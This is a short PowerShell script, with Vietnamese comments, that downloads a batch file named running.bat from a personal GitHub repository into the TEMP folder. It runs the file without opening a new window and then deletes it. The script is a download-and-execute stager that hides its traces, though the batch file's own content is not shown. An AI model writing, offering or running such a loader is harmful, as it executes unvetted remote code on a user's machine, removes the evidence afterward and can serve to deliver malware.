$TempPath = [System.IO.Path]::Combine($env:TEMP, "running.bat")
$URL = "https://raw.githubusercontent.com/mitukitii/test/main/running.bat"

# Tải file về thư mục temp
Invoke-WebRequest -Uri $URL -OutFile $TempPath

# Chạy file .bat và chờ hoàn tất
Start-Process -FilePath $TempPath -Wait -NoNewWindow

# Xóa file sau khi chạy xong
Remove-Item -Path $TempPath -Force
